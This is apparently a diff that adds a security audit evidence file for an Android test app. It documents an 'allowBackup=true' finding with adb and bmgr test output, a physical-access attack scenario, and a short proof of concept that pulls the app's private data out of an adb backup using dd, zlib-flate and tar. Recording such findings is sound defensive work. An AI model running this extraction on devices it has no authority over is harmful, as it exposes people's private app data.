@@ -1,0 +1,41 @@
+=== Evidence HIGH-001: allowBackup=true ===
+Manifest line:
+4:    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:label="@string/app_name" android:supportsRtl="true" android:theme="@style/Theme.AndroidTest">
+
+ADB backup test (requires user confirmation):
+adb backup -f backup.ab com.onkar.androidtest
+# Output: WARNING: adb backup is deprecated... Now unlock your device and confirm the backup operation...
+
+Backup dialog confirmed as blocker:
+- Backup dialog shown: com.android.backupconfirm/.BackupRestoreConfirmation
+- Top resumed activity: BackupRestoreConfirmation
+- Backup file remains 0 bytes until user confirms
+
+bmgr backup test:
+bmgr backupnow com.onkar.androidtest
+# Output: "Backup finished with result: Backup is not allowed"
+
+App data present (would be included in backup):
+/data/data/com.onkar.androidtest/files/profileInstalled
+
+Attack scenario confirmed:
+1. Attacker gains physical access to unlocked device with USB debugging enabled
+2. Attacker runs: adb backup -f backup.ab com.onkar.androidtest
+3. Backup confirmation dialog appears on device
+4. User confirms (social engineering or auto-confirm on some MDM configs)
+5. Attacker extracts .ab file: dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress > backup.tar
+6. Attacker accesses all files in /data/data/com.onkar.androidtest/
+
+Proof of Concept:
+adb backup -f backup.ab com.onkar.androidtest
+# User confirms on device (dialog: com.android.backupconfirm/.BackupRestoreConfirmation)
+dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress > backup.tar
+tar -xf backup.tar
+# Contents of app's private data now accessible
+
+Impact:
+- Confidentiality: High - all private app data extractable (requires user confirmation)
+- Integrity: None - backup is read-only
+- Availability: None
+
+Status: CONFIRMED - allowBackup=true enables backup capability; dialog confirmation required on modern Android
